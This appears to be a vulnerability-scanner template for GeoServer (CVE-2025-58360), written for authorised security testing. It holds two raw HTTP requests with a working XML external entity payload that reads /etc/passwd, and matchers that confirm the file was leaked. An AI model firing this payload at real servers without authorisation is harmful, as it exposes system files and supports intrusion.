id: geoserver-cve-2025-58360-xxe

info:
  name: GeoServer XXE Injection Detection
  author: iSee857
  severity: high
  description: |
    This template detects XXE vulnerability in GeoServer by sending a crafted XML payload to the WMS endpoint.
    The template checks for the presence of 'root:x' and 'bin:' in the response body.
  tags: xxe, geoserver, cve, dast

http:
  - raw:
      - |
        POST /geoserver/wms?service=WMS&version=1.1.0&request=GetMap&width=100&height=100&format=image/png&bbox=-180,-90,180,90 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE StyledLayerDescriptor [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <StyledLayerDescriptor version="1.0.0"
          xmlns="http://www.opengis.net/sld">
          <NamedLayer>
            <Name>&xxe;</Name>
            <UserStyle>
              <Name>style</Name>
            </UserStyle>
          </NamedLayer>
        </StyledLayerDescriptor>

      - |
        POST /wms?service=WMS&version=1.1.0&request=GetMap&width=100&height=100&format=image/png&bbox=-180,-90,180,90 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE StyledLayerDescriptor [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <StyledLayerDescriptor version="1.0.0"
          xmlns="http://www.opengis.net/sld">
          <NamedLayer>
            <Name>&xxe;</Name>
            <UserStyle>
              <Name>style</Name>
            </UserStyle>
          </NamedLayer>
        </StyledLayerDescriptor>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:x"
          - "bin:"
        part: body
        condition: and
